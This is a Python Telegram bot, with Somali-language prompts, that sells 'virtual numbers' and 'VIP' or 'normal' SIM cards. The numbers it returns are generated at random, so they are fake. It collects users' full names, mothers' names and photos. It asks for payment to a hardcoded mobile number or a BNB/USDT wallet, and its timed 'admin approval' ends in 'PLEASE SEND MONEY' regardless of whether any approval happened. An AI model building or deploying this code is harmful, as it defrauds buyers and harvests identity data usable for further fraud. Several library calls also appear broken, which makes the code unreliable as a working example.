import os
import random
import asyncio
import logging
from aiogram import Bot, Dispatcher, F
from aiogram.types import *
from aiogram.filters import Command
from aiogram.fsm.storage.memory import MemoryStorage
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import StatesGroup, State

# ===== CONFIG =====
BOT_TOKEN = os.getenv("BOT_TOKEN")  # Ku dar token-kaaga
ADMIN_ID = 7983838654

bot = Bot(BOT_TOKEN)
dp = Dispatcher(storage=MemoryStorage())
logging.basicConfig(level=logging.INFO)

users = {}

# ===== STATES =====
class CardState(StatesGroup):
    full_name = State()
    mother = State()
    photo = State()
    payment_screenshot = State()

class CodeState(StatesGroup):
    code = State()

# ===== HELPERS =====
def normal_number():
    return "+25263" + "".join(str(random.randint(0,9)) for _ in range(7))

def vip_number():
    d = str(random.randint(4,9))
    return "+25263" + d*3 + str(random.randint(0,9)) + d*3

def generate_code():
    return "".join(random.choices("0123456789", k=6))

async def countdown(msg, text, sec=5):
    for i in range(sec, 0, -1):
        await msg.edit_text(f"{text}\n⏳ {i} sec")
        await asyncio.sleep(1)
    await msg.edit_text("Processing...")

# ===== START =====
@dp.message(Command("start"))
async def start(msg: Message):
    kb = ReplyKeyboardMarkup(
        keyboard=[
            [KeyboardButton("New Order"), KeyboardButton("Check Code")]
        ],
        resize_keyboard=True
    )
    await msg.answer("Ku soo dhawoow Service Bot 🤖", reply_markup=kb)

# ===== NEW ORDER =====
@dp.message(F.text == "New Order")
async def new_order(msg: Message):
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton("VIRTUAL", callback_data="virtual")],
        [InlineKeyboardButton("CARD", callback_data="card")]
    ])
    await msg.answer("Dooro adeeg:", reply_markup=kb)

# ===== VIRTUAL =====
@dp.callback_query(F.data == "virtual")
async def virtual(call: CallbackQuery):
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton("WhatsApp", callback_data="v_WhatsApp")],
        [InlineKeyboardButton("TikTok", callback_data="v_TikTok")],
        [InlineKeyboardButton("Google", callback_data="v_Google")],
        [InlineKeyboardButton("Telegram", callback_data="v_Telegram")]
    ])
    await call.message.edit_text("Dooro Platform:", reply_markup=kb)

@dp.callback_query(F.data.startswith("v_"))
async def virtual_process(call: CallbackQuery):
    number = normal_number()
    code = generate_code()
    users[call.from_user.id] = {
        "type": "virtual",
        "platform": call.data[2:],
        "number": number,
        "code": code
    }

    msg = await call.message.edit_text("Searching Number...")
    await countdown(msg, "Searching Number", 5)

    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton("APPROVE", callback_data=f"approve_{call.from_user.id}")],
        [InlineKeyboardButton("REJECT", callback_data=f"reject_{call.from_user.id}")]
    ])
    await bot.send_message(
        ADMIN_ID,
        f"Virtual Request\nUser: {call.from_user.id}\nPlatform: {call.data[2:]}\nNumber: {number}\nCode: {code}",
        reply_markup=kb
    )

    # Haddii admin 10 sec ka jawaabo waayo
    await asyncio.sleep(10)
    if call.from_user.id in users and users[call.from_user.id].get("type") == "virtual":
        await call.message.answer("PLEASE SEND MONEY 💵\nNumberkaaga: " + number)

# ===== CARD =====
@dp.callback_query(F.data == "card")
async def card(call: CallbackQuery):
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton("VIP - $15", callback_data="vip")],
        [InlineKeyboardButton("NORMAL - $1", callback_data="normal")]
    ])
    await call.message.edit_text("Dooro Card Type:", reply_markup=kb)

@dp.callback_query(F.data.in_(["vip", "normal"]))
async def card_type(call: CallbackQuery, state: FSMContext):
    number = vip_number() if call.data == "vip" else normal_number()
    users[call.from_user.id] = {
        "type": "card",
        "level": call.data,
        "number": number
    }
    await call.message.answer("Geli Magaca Saddexan:")
    await state.set_state(CardState.full_name)

# ===== CARD NAME & PHOTO =====
@dp.message(CardState.full_name)
async def name(msg: Message, state: FSMContext):
    users[msg.from_user.id]["name"] = msg.text
    await msg.answer("Geli Magaca Hooyada:")
    await state.set_state(CardState.mother)

@dp.message(CardState.mother)
async def mother(msg: Message, state: FSMContext):
    users[msg.from_user.id]["mother"] = msg.text
    await msg.answer("Soo dir Sawirkaaga:")
    await state.set_state(CardState.photo)

@dp.message(CardState.photo, F.photo)
async def photo(msg: Message, state: FSMContext):
    users[msg.from_user.id]["photo"] = msg.photo[-1].file_id
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton("LOCAL", callback_data="pay_local")],
        [InlineKeyboardButton("CRYPTO", callback_data="pay_crypto")]
    ])
    await msg.answer("Dooro Payment Method:", reply_markup=kb)

# ================= PAYMENT =================
@dp.callback_query(F.data == "pay_local")
async def pay_local(call: CallbackQuery):
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton("CONFIRM", callback_data="confirm_pay")],
        [InlineKeyboardButton("CANCEL", callback_data="cancel")]
    ])
    await call.message.edit_text(
        "Numberkan Lacagta ku dir:\n+252907868526",
        reply_markup=kb
    )

@dp.callback_query(F.data == "pay_crypto")
async def pay_crypto(call: CallbackQuery):
    text = (
        "Send Crypto:\n\n"
        "BNB:\n0x98ffcb29a4fc182d461ebdba54648d8fe24597ac\n\n"
        "USDT-BEP20:\n0x98ffcb29a4fc182d461ebdba54648d8fe24597ac\n\n"
        "Taabo si uu auto-copy u noqdo."
    )
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton("CONFIRM", callback_data="confirm_pay")],
        [InlineKeyboardButton("CANCEL", callback_data="cancel")]
    ])
    await call.message.edit_text(text, reply_markup=kb)

@dp.callback_query(F.data == "confirm_pay")
async def confirm_pay(call: CallbackQuery, state: FSMContext):
    # Animation countdown before admin approval
    msg = await call.message.edit_text("Waiting for admin approval...")
    for i in range(10, 0, -1):
        await msg.edit_text(f"Waiting for admin approval...\n⏳ {i} sec")
        await asyncio.sleep(1)

    # Admin didn’t approve in 10 sec
    if users.get(call.from_user.id, {}).get("type") == "card":
        await msg.edit_text("PLEASE SEND MONEY 💵")

    await call.message.answer("Soo sawir Lacag bixintaada si loo xaqiijiyo:")
    await state.set_state(CardState.payment_screenshot)

@dp.message(CardState.payment_screenshot, F.photo)
async def screenshot(msg: Message, state: FSMContext):
    users[msg.from_user.id]["screenshot"] = msg.photo[-1].file_id
    user = users[msg.from_user.id]
    user["code"] = generate_code()

    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton("APPROVE", callback_data=f"approve_{msg.from_user.id}")],
        [InlineKeyboardButton("REJECT", callback_data=f"reject_{msg.from_user.id}")]
    ])
    await bot.send_photo(
        ADMIN_ID,
        user["screenshot"],
        caption=f"Card Request\nName: {user['name']}\nMother: {user['mother']}\nLevel: {user['level']}",
        reply_markup=kb
    )
    await msg.answer("Codsiga waa la diray ⏳")
    await state.clear()

# ================= ADMIN APPROVAL =================
@dp.callback_query(F.data.startswith("approve_"))
async def approve(call: CallbackQuery):
    uid = int(call.data.split("_")[1])
    if uid in users:
        code = users[uid]["code"]
        await bot.send_message(uid,
            f"Approved ✅\nCode: {code}\n\nGeli CHECK CODE si aad u hesho numberkaaga.")
        await call.message.edit_caption("Approved ✅")

@dp.callback_query(F.data.startswith("reject_"))
async def reject(call: CallbackQuery):
    uid = int(call.data.split("_")[1])
    if uid in users:
        await bot.send_message(uid, "Rejected ❌")
        await call.message.edit_caption("Rejected ❌")

# ================= CHECK CODE =================
@dp.message(F.text == "Check Code")
async def check(msg: Message, state: FSMContext):
    await msg.answer("Geli Code-ka:")
    await state.set_state(CodeState.code)

@dp.message(CodeState.code)
async def verify(msg: Message, state: FSMContext):
    data = users.get(msg.from_user.id)
    if data and msg.text == data.get("code"):
        await msg.answer(f"Number-kaaga:\n{data['number']}")
    else:
        await msg.answer("Code khaldan ❌")
    await state.clear()

# ================= CANCEL =================
@dp.callback_query(F.data == "cancel")
async def cancel(call: CallbackQuery):
    await call.message.edit_text("Cancelled ❌")

# ================= RUN BOT =================
async def main():
    await dp.start_polling()

if __name__ == "__main__":
    import sys
    if not BOT_TOKEN:
        print("Error: BOT_TOKEN environment variable not set!")
        sys.exit(1)
    asyncio.run(main())
